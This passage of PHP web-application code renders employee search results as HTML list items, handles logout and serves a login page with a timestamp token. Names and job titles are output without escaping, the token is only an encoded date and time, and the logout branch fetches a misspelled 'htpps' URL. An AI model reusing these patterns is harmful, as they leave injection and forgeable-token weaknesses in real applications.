            $li .= "<li data-name='" . ($em->nombre_completo) . "' data-rut='" . Encodear3($em->rut) . "'>
                        <div class='PadSearchButton'>
                            <span class='w700'>" . ($em->nombre_completo) . "</span>, " . ($em->cargo) . "" . $novigente . "
                        </div>
                    </li>";
        }
    } else {
        $li = '<li class="resultado">Registros no encontrados</li>';
    }

    echo $li;
    exit;
}


else if ($seccion == "logout") {
    unset($_COOKIE["user_"]);
    unset($_COOKIE["id_empresa"]);
    unset($_SESSION);
    session_start();
    $_SESSION = array();
    if (isset($_COOKIE[session_name()])) {
        setcookie(session_name(), '', time() - 42000, '/');
    }
    session_destroy();
    $PRINCIPAL = FuncionesTransversales(file_get_contents("htpps://www.google.cl"));
    echo $PRINCIPAL;
}
else {
    session_start();
    $_SESSION = array();
    if (isset($_COOKIE[session_name()])) {
        setcookie(session_name(), '', time() - 42000, '/');
    }
    session_destroy();
    $PRINCIPAL = FuncionesTransversales(file_get_contents("" . $url_front . "/front/views/home/login.html"));
    $token_fecha_hora = Encodear3(date("Y-m-d") . " " . date("H:i:s"));
    $PRINCIPAL = str_replace("{TOKEN_FECHA_HORA}", $token_fecha_hora, $PRINCIPAL);
    session_start();
    $_SESSION["token"] = $token_fecha_hora;
    echo $PRINCIPAL;
}
?>